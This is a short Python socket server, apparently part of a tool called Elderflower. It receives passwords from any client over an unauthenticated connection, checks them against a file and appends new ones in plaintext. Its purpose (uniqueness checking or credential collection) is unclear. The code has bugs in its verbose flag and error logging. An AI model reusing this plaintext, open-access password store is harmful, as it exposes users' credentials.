# scripted by @n4zgu1
# belongs to elderflower.py v1.0.3
# logs received passwords to file

import socket
import time
import getopt
import sys


sock = socket.socket()
host = ''
argv = sys.argv[1:]

if(len(sys.argv) < 3):
    print('Usage: python server.py -p [port] -f [path/to/file] -v (verbose mode)')
    exit()
    
opts, args = getopt.getopt(argv, 'p:f:v')
for opt, arg in opts:
    if opt in ['-p']:
        port = int(arg)
    if opt in ['-f']:
        path = arg
    if opt in ['-v']:
        verbose = True
    else: verbose = False

            
# check if password is already used
def check(string):
    with open(path, 'r') as f_check:
        if string in f_check.read():
            print(string)
            return True
        return False


if __name__ == '__main__':
    sock.bind((host, port))
    sock.listen(20)
    print(f'''
            Elderflower v1.0.3
            scripted by @n4zgu1

            Server is now listening...
    ''')
    while True:
        try:
            conn, addr = sock.accept()
            data = conn.recv(1024).decode('utf-8')
            timestamp = time.ctime(time.time())
            if verbose:
                print(f'{timestamp} - Receieved data from {addr[0]}')
            if(check(data)): 
                payload = 'True'
            else: 
                payload = 'False'
                with open(path, 'a') as f_out:
                    f_out.write(data + '\n')
            conn.send(payload.encode('utf-8'))
        except Exception as e:
            with open('error.log', 'a') as f:
                f.write(e)